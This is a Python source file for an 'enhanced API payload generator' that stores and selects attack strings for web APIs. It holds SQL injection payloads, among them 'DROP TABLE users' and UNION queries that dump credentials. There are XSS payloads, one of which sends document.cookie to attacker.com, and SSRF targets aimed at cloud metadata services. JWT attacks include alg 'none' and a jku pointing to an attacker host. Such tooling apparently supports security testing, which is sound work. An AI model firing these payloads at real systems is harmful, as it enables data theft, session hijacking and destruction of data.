#!/usr/bin/env python3
"""
Enhanced API Payload Generator
Advanced payload generation with context awareness and sophisticated bypass techniques
"""

import json
import base64
import hashlib
import hmac
import time
import random
import string
import re
from urllib.parse import urlencode, quote, unquote
from typing import Dict, List, Any, Optional, Tuple
from collections import defaultdict
import logging

class EnhancedAPIPayloadGenerator:
    """
    Enhanced API payload generator with advanced techniques and context awareness
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.payloads = {}
        self.context_patterns = {}
        self._initialize_payloads()
        self._initialize_context_patterns()
    
    def _initialize_payloads(self):
        """Initialize enhanced payload collections"""
        
        # Advanced SQL Injection payloads
        self.payloads['sql_injection'] = {
            'basic': [
                "' OR '1'='1",
                "' OR 1=1--",
                "'; DROP TABLE users--",
                "' UNION SELECT NULL--",
                "admin'--"
            ],
            'advanced': [
                "' UNION SELECT username,password FROM users WHERE '1'='1",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'time_based': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5(1))))a)--"
            ]
        }
        
        # Advanced XSS payloads
        self.payloads['xss'] = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            'advanced': [
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
            ]
        }
        
        # Advanced SSRF payloads
        self.payloads['ssrf'] = {
            'internal_networks': [
                "http://127.0.0.1",
                "http://localhost",
                "http://10.0.0.1",
                "http://192.168.1.1"
            ],
            'cloud_metadata': [
                "http://169.254.169.254/latest/meta-data/",  # AWS
                "http://metadata.google.internal/computeMetadata/v1/",  # GCP
                "http://metadata.azure.internal/metadata/instance"  # Azure
            ]
        }
        
        # Advanced JWT payloads
        self.payloads['jwt'] = {
            'algorithm_confusion': [
                '{"alg": "none"}',
                '{"alg": "HS256", "typ": "JWT"}'
            ],
            'header_injection': [
                '{"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}',
                '{"alg": "HS256", "typ": "JWT", "jku": "https://attacker.com/jwks.json"}'
            ]
        }
    
    def _initialize_context_patterns(self):
        """Initialize context-aware pattern matching"""
        self.context_patterns = {
            'authentication': {
                'headers': ['authorization', 'x-api-key', 'x-auth-token', 'cookie'],
                'params': ['token', 'key', 'secret', 'auth', 'session']
            },
            'user_input': {
                'params': ['search', 'query', 'filter', 'sort', 'page', 'limit'],
                'body_fields': ['comment', 'message', 'content', 'text']
            }
        }
    
    def generate_context_aware_payloads(self, request: Any, vulnerability_type: str) -> List[str]:
        """Generate context-aware payloads based on request analysis"""
        try:
            context = self._analyze_request_context(request)
            base_payloads = self.payloads.get(vulnerability_type, {}).get('basic', [])
            
            if vulnerability_type == 'sql_injection':
                context_payloads = self._generate_sql_injection_context_payloads(context, base_payloads)
            elif vulnerability_type == 'xss':
                context_payloads = self._generate_xss_context_payloads(context, base_payloads)
            else:
                context_payloads = []
            
            all_payloads = base_payloads + context_payloads
            seen = set()
            unique_payloads = []
            for payload in all_payloads:
                if payload not in seen:
                    seen.add(payload)
                    unique_payloads.append(payload)
            
            return unique_payloads
        
        except Exception as e:
            self.logger.warning(f"Error generating context-aware payloads: {e}")
            return self.payloads.get(vulnerability_type, {}).get('basic', [])
    
    def _analyze_request_context(self, request: Any) -> Dict[str, Any]:
        """Analyze request context for payload generation"""
        context = {
            'headers': {},
            'params': {},
            'body_fields': {},
            'content_type': '',
            'method': '',
            'path': ''
        }
        
        try:
            headers = getattr(request, 'headers', {}) or {}
            context['headers'] = {k.lower(): v for k, v in headers.items()}
            
            params = getattr(request, 'parameters', {}) or {}
            context['params'] = {k.lower(): v for k, v in params.items()}
            
            context['content_type'] = context['headers'].get('content-type', '')
            context['method'] = getattr(request, 'method', 'GET')
            context['path'] = getattr(request, 'path', '')
        
        except Exception as e:
            self.logger.debug(f"Error analyzing request context: {e}")
        
        return context
    
    def _generate_sql_injection_context_payloads(self, context: Dict[str, Any], base_payloads: List[str]) -> List[str]:
        """Generate context-aware SQL injection payloads"""
        context_payloads = []
        
        db_params = ['id', 'user_id', 'post_id', 'comment_id']
        for param in db_params:
            if param in context['params']:
                param_value = context['params'][param]
                if isinstance(param_value, (int, str)) and str(param_value).isdigit():
                    context_payloads.extend([
                        f"1' OR '1'='1",
                        f"1' UNION SELECT NULL--"
                    ])
        
        return context_payloads
    
    def _generate_xss_context_payloads(self, context: Dict[str, Any], base_payloads: List[str]) -> List[str]:
        """Generate context-aware XSS payloads"""
        context_payloads = []
        
        user_input_params = ['search', 'query', 'comment', 'message', 'content']
        for param in user_input_params:
            if param in context['params']:
                context_payloads.extend([
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>"
                ])
        
        return context_payloads
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get comprehensive payload statistics"""
        stats = {
            'total_payloads': 0,
            'by_category': {},
            'by_complexity': {'basic': 0, 'advanced': 0}
        }
        
        for category, payload_types in self.payloads.items():
            category_count = 0
            for payload_type, payloads in payload_types.items():
                if isinstance(payloads, list):
                    category_count += len(payloads)
                    if payload_type == 'basic':
                        stats['by_complexity']['basic'] += len(payloads)
                    else:
                        stats['by_complexity']['advanced'] += len(payloads)
            
            stats['by_category'][category] = category_count
            stats['total_payloads'] += category_count
        
        return stats
